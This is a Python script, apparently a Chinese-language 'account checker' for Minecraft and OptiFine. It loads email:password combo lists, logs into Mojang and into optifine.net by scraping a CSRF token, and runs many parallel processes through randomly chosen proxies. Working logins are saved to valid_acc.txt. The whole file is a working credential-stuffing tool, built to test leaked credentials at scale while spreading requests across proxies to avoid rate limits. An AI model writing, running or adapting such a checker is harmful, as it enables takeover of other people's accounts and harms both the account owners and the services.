from mojang import Client
from mojang.errors import LoginFailure
import time
import os
import requests
import random
from multiprocessing import Pool, Manager, Lock
import sys

def show_banner():
    print('''
██╗  ██╗███████╗     ██╗██╗
██║ ██╔╝██╔════╝     ██║██║
█████╔╝ █████╗       ██║██║
██╔═██╗ ██╔══╝  ██   ██║██║
██║  ██╗███████╗╚█████╔╝██║
╚═╝  ╚═╝╚══════╝ ╚════╝ ╚═╝
[+]版本1.0
[+]代理、账号自备
[+]主要功能：
[+]1.验证Minecraft账号
[+]2.验证OptiFine披风
[+]本程序遵守GPL-3.0协议
''')

def init(l, p):
    global lock, proxies
    lock = l
    proxies = p

def check_of_account(email, password):
    """验证OptiFine账户有效性"""
    try:
        with requests.Session() as s:
            proxy = random.choice(proxies) if proxies else None
            proxies_dict = {"http": proxy, "https": proxy} if proxy else None
            
            login_page = s.get("https://optifine.net/login", 
                             timeout=5, 
                             proxies=proxies_dict)
            csrf_token = login_page.text.split('name="csrfToken" value="')[1].split('"')[0]
            
            resp = s.post("https://optifine.net/login", 
                         data={
                             "username": email,
                             "password": password,
                             "csrfToken": csrf_token,
                             "remember": "true"
                         }, 
                         timeout=5,
                         allow_redirects=False,
                         proxies=proxies_dict)
            
            return resp.status_code == 302
    except Exception:
        return False

def worker(args):
    """多进程工作函数"""
    email, password = args
    try:
        start = time.time()
        
        # Mojang验证
        client = Client(email, password)
        profile = client.get_profile()
        
        # 获取Mojang披风
        cape_names = [cape.alias for cape in profile.capes] if profile.capes else []
        minecraft_capes = ', '.join(cape_names) if cape_names else '无'
        
        # OF验证
        of_status = '✔' if check_of_account(email, password) else '✘'
        
        elapsed = time.time() - start
        
        # 格式化输出
        with lock:
            print(f"│ 🌟 {email:<16} │ {profile.name:^10} │ {minecraft_capes:<18} │ {of_status:^4} │ {elapsed:.2f}s │")
        
        return (True, email, password)
        
    except Exception:
        with lock:
            print(f"│ 💀 {email:<16} │ {'-':^10} │ {'-':^18} │ {'-':^4} │ {'-':^6} │")
        return (False, email, None)

def process_accounts(file_path, proxy_list=None, workers=4):
    """多进程处理验证流程"""
    valid_file = os.path.join(os.path.dirname(file_path), "valid_acc.txt")
    
    # 初始化输出
    print("╔══════════════════════════════════════════════════════════════════╗")
    print("│                    Minecraft 账户验证系统 v3.0                 │")
    print("╠══════════════════╦════════════╦══════════════════╦══════╦═══════╣")
    print("│ 邮箱             │ 游戏ID     │ Minecraft披风     │ OF   │ 耗时  │")
    
    # 准备任务列表
    tasks = []
    with open(file_path, 'r', encoding='utf-8') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line and not line.startswith('#'):
                email, password = line.split(':', 1)
                tasks.append((email.strip(), password.strip()))
    
    # 执行验证
    start_time = time.time()
    with Manager() as manager:
        output_lock = manager.Lock()
        with Pool(initializer=init, initargs=(output_lock, proxy_list), processes=workers) as pool:
            results = []
            valid_count = 0
            
            # 清空旧文件
            with open(valid_file, 'w', encoding='utf-8') as f:
                f.write(f"# 有效账户列表 {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            # 处理结果
            for result in pool.imap_unordered(worker, tasks):
                if result[0]:
                    valid_count += 1
                    with open(valid_file, 'a', encoding='utf-8') as f:
                        f.write(f"{result[1]}:{result[2]}\n")
            
            total = len(tasks)
            
    # 输出统计
    print("╠══════════════════╩════════════╩══════════════════╩══════╩═══════╣")
    print(f"│ 验证完成 | 总数: {total:02d} | 成功: {valid_count:02d} | 失败: {total-valid_count:02d}          │")
    print("╚══════════════════════════════════════════════════════════════════╝")
    print(f"📂 有效账户已保存至: {os.path.abspath(valid_file)}")
    print(f"总耗时: {time.time() - start_time:.2f}秒")

if __name__ == "__main__":
    show_banner()
    
    # 代理配置
    proxy_list = None
    if input("是否使用代理？(Y/N): ").lower() == 'y':
        proxy_file = input("请输入代理文件路径（默认proxy.txt）: ").strip() or "proxy.txt"
        try:
            with open(proxy_file, 'r', encoding='utf-8') as f:
                proxy_list = [line.strip() for line in f if line.strip()]
            print(f"✅ 已加载 {len(proxy_list)} 个代理")
        except Exception as e:
            print(f"⛔ 代理加载失败: {str(e)}")
    
    # 进程数配置
    try:
        workers = int(input(f"请输入并发进程数（推荐 {os.cpu_count()}）: ") or os.cpu_count())
    except:
        workers = 4
    
    # 文件验证
    while True:
        try:
            path = input("\n🖱️ 拖放账户文件到窗口或输入路径: ").strip('"').strip()
            if os.path.isfile(path):
                process_accounts(path, proxy_list, workers)
                break
            print("❌ 文件不存在，请检查路径")
        except KeyboardInterrupt:
            print("\n操作已取消")
            exit()
        except Exception as e:
            print(f"错误: {str(e)}")

    input("\n🚪 按回车键退出...")
